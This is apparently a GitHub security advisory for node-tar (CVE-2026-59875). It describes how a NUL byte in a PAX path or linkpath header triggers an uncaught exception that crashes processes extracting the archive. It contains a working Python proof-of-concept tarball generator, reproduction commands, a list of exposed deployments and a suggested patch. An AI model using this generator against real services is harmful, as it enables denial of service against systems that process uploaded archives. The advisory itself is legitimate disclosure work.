# [M] node-tar: Uncaught Exception DoS via NUL byte in PAX path/linkpath records

## Summary
Severity: Medium
Advisory: GHSA-gvwx-54wh-qm9j
CVE: CVE-2026-59875
CWE: CWE-248
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-gvwx-54wh-qm9j
Type: github-advisory

## Affected
- npm: `tar` — affected >=0 <7.5.17

## Details
## Summary

`node-tar` strips trailing `NUL` bytes from long-name (`L`) and long-linkpath (`K`) GNU extended headers but does **not** apply the same sanitization to equivalent fields delivered via PAX (`x` typeflag) extended headers. A PAX record of the form `path=visible.txt\x00hidden.txt` is parsed verbatim into `entry.path` and flows into `fs.lstat()` / `fs.open()`, which Node.js core rejects with `ERR_INVALID_ARG_VALUE`. The throw originates inside an `FSReqCallback` async chain that is **not** wrapped by the consumer's `await/try-catch` around `tar.x()` — it surfaces as `uncaughtException` and terminates the process.

This is a remote denial-of-service primitive against any process that extracts attacker-supplied tarballs through `tar.x` / `tar.extract` / `tar.t` / `tar.Parser`, even when the consumer follows the documented `try/catch` error-handling pattern.

A secondary parser-differential (CWE-436) exists because `tar(1)`, `bsdtar`, and Python `tarfile` truncate the path at the first `NUL` (yielding `visible.txt`) while node-tar retains the full string. A validator that pre-scans a tarball with one tool and extracts with the other is bypassed.

---

## Root cause

### Vulnerable sink — `src/pax.ts:157-183`

PAX KV records flow through `parseKVLine`. The value half (`v`) is assigned directly to the result object with no sanitization for embedded NUL bytes:

```ts
// src/pax.ts:157
const parseKVLine = (set: Record<string, unknown>, line: string) => {
  const n = parseInt(line, 10)
  if (n !== Buffer.byteLength(line) + 1) return set
  line = line.slice((n + ' ').length)
  const kv = line.split('=')
  const r = kv.shift()
  if (!r) return set
  const k = r.replace(/^SCHILY\.(dev|ino|nlink)/, '$1')
  const v = kv.join('=')                                 // <-- NO NUL STRIP
  set[k] =
    /^([A-Z]+\.)?([mac]|birth|creation)time$/.test(k) ?
      new Date(Number(v) * 1000)
    : /^[0-9]+$/.test(v) ? +v
    : v                                                  // <-- v with NULs lands here
  return set
}
```

The PAX record body is length-prefixed, so the parser knows the exact byte boundary — but it never checks whether the value half between `=` and `\n` contains `NUL`. The result is consumed by `Header` / `ReadEntry`, where `entry.path` and `entry.linkpath` carry the embedded NUL all the way to `fs.lstat()`.

### Correctly-patched cousin sink — `src/parse.ts:375-388`

The equivalent code path for GNU L/K long-headers **does** strip NUL bytes:

```ts
// src/parse.ts:375
case 'NextFileHasLongPath':
case 'OldGnuLongPath': {
  const ex = this[EX] ?? Object.create(null)
  this[EX] = ex
  ex.path = this[META].replace(/\0.*/, '')               // <-- NUL strip applied
  break
}
case 'NextFileHasLongLinkpath': {
  const ex = this[EX] || Object.create(null)
  this[EX] = ex
  ex.linkpath = this[META].replace(/\0.*/, '')           // <-- NUL strip applied
  break
}
```

The `parse.ts` fix is the maintainer's own acknowledgement that path strings on this codepath must be NUL-stripped before reaching `fs.*`. The PAX path produces the identical primitive but bypasses the guard.

### Downstream blast radius

`entry.path` and `entry.linkpath` are consumed in:
- `src/unpack.ts` → `fs.lstat`, `fs.open`, `fs.symlink`, `fs.link`, `fs.mkdir`
- `src/list.ts` (no crash — listing tolerates NUL in strings)
- Any consumer of the `ReadEntry` event that calls `path.join()` / `fs.*` on `entry.path`

The crash fires inside the FSReqCallback Node-internal async machinery, **outside** the user's `await tar.x(...)` Promise rejection boundary.

---

## Proof of Concept

### Artifacts
- `poc-null-byte-crash.tar` — 3072 bytes — PAX `path=visible.txt\x00hidden.txt`
- `poc-null-linkpath-crash.tar` — 2560 bytes — PAX `linkpath=target\x00garbage` (symlink target sink)
- `poc1-pax-prefix.py` — minimal PAX-header builder (Python 3, no deps)

### Tarball generator (minimal repro — Python 3)

```python
#!/usr/bin/env python3
"""Minimal PAX-NUL-injection tarball generator for node-tar PoC."""
import os

def cksum(b):
    s = 0
    for i, x in enumerate(b):
        s += 0x20 if 148 <= i < 156 else x
    return s

def pad512(buf):
    rem = len(buf) % 512
    return buf + b'\0' * (512 - rem) if rem else buf

def hdr(name, size, typeflag, prefix=b'', linkpath=b''):
    b = bytearray(512)
    b[0:len(name[:100])] = name[:100]
    b[100:108] = b'0000644\0'
    b[108:116] = b'0001000\0'
    b[116:124] = b'0001000\0'
    b[124:136] = ('%011o ' % size).encode()
    b[136:148] = ('%011o ' % 0).encode()
    b[148:156] = b'        '
    b[156:157] = typeflag
    b[157:157+len(linkpath[:100])] = linkpath[:100]
    b[257:265] = b'ustar\x0000'
    b[265:270] = b'root\0'
    b[297:302] = b'root\0'
    b[329:337] = b'0000000\0'
    b[337:345] = b'0000000\0'
    b[345:345+len(prefix[:155])] = prefix[:155]
    s = cksum(b)
    b[148:156] = ('%06o\0 ' % s).encode()
    return bytes(b)

def pax(records):
    body = b''
    for k, v in records:
        kv = b' ' + k + b'=' + v + b'\n'
        for digits in range(1, 8):
            total = digits + len(kv)
            if len(str(total)) == digits:
                break
        body += str(total).encode() + kv
    return pad512(hdr(b'PaxHeader/poc', len(body), b'x') + body)

out  = pax([(b'path', b'visible.txt\x00hidden.txt')])  # NUL in PAX path
out += hdr(b'placeholder', 1, b'0')
out += pad512(b'A')
out += b'\0' * 1024  # end-of-archive

open('poc.tar', 'wb').write(out)
```

### Reproduction

```bash
# 1. Generate tarball
python3 poc1-pax-prefix.py          # writes poc.tar (3 KB)

# 2. Install vulnerable version
mkdir repro && cd repro
npm init -y && npm install tar@7.5.16

# 3. Try to extract with documented try/catch — observe uncaught exception
mkdir -p ./out
node --input-type=module -e '
  process.on("uncaughtException", e => {
    console.log("UNCAUGHT:", e.code, "-", e.message);
    process.exit(99);
  });
  import("tar").then(async tar => {
    try {
      await tar.x({ file: "../poc.tar", cwd: "./out" });
      console.log("NORMAL_RETURN");
    } catch (e) {
      console.log("CAUGHT_BY_USER:", e.code);
    }
  });'
```

### Observed output (verified 2026-06-23 against `tar@7.5.16`)

```
UNCAUGHT: ERR_INVALID_ARG_VALUE - The argument 'path' must be a string,
Uint8Array, or URL without null bytes.
Received '/.../out/visible.txt\x00hidden.txt'
exit: 99
```

The exception bypasses the user's `try { await tar.x(...) } catch (e) { ... }` block and lands in the global `uncaughtException` handler. In a typical server without that handler, the process exits.

---

## Impact

### Direct: remote DoS

Any service that ingests attacker-supplied tarballs via node-tar inherits a one-tarball-kills-the-process primitive. Realistic deployments where this is reachable without user interaction:

- npm registry tarball ingestion and downstream mirrors
- GitHub Actions cache restore (`actions/cache`, `actions/setup-*` extracting toolchains)
- Container image build pipelines that unpack layer tarballs through node tooling
- Backup-restore services accepting user uploads
- CI artifact processors and badge generators
- Static-site / Docusaurus / Next.js build runners that fetch and extract dep tarballs
- Cloud functions that auto-extract uploaded archives

A correctly-coded consumer that does:

```js
try {
  await tar.x({ file: req.upload.path, cwd: tmpdir });
} catch (e) {
  return res.status(400).json({ error: 'bad archive' });
}
```

does not catch this throw. The Node process dies and (depending on the supervisor) the worker may take time to respawn or never respawn if it dies during boot.

### Secondary: parser-differential validator bypass (CWE-436)

| Tool                       | Result for `path=visible.txt\x00hidden.txt` |
|----------------------------|----------------------------------------------|
| GNU tar (`tar -tvf`)       | Lists `visible.txt` (truncated at NUL)      |
| `bsdtar -tvf`              | Lists `visible.txt` (truncated at NUL)      |
| Python `tarfile.list()`    | Lists `visible.txt\x00hidden.txt` (raw)     |
| node-tar `tar.t({file})`   | Emits raw NUL-bearing path (no crash)       |
| node-tar `tar.x({file})`   | **Crashes** (uncaught throw)                |

A pre-flight validator using GNU tar or bsdtar will see a benign filename; the subsequent node-tar extraction blows up. This is exploitable against any architecture that lists-and-validates-then-extracts.

---

## Suggested patch

Match the long-name handler in `parse.ts` — strip everything from the first NUL onward in `parseKVLine` value parsing:

```diff
--- a/src/pax.ts
+++ b/src/pax.ts
@@ -173,7 +173,7 @@ const parseKVLine = (set: Record<string, unknown>, line: string) => {

   const k = r.replace(/^SCHILY\.(dev|ino|nlink)/, '$1')

-  const v = kv.join('=')
+  const v = kv.join('=').replace(/\0.*$/, '')
   set[k] =
     /^([A-Z]+\.)?([mac]|birth|creation)time$/.test(k) ?
       new Date(Number(v) * 1000)
```

This matches `src/parse.ts:379` and `src/parse.ts:386` and closes both `path` and `linkpath` sinks in one change.

A defense-in-depth follow-up: add an explicit `assert(!v.includes('\0'))` (or fail-soft `return set`) at the top of `parseKVLine` so malformed PAX records that *aren't* path/linkpath also can't smuggle NUL into other unanticipated consumers (e.g. third-party readers of `entry.header.atime` Date objects constructed from `Number(v)` where `v` had embedded NUL).

## References
- https://github.com/isaacs/node-tar/security/advisories/GHSA-gvwx-54wh-qm9j
- https://nvd.nist.gov/vuln/detail/CVE-2026-59875
- https://github.com/isaacs/node-tar/commit/7a635c29f5edbf083557374d43984273ecfed5b3
- https://github.com/isaacs/node-tar
- https://github.com/isaacs/node-tar/releases/tag/v7.5.17
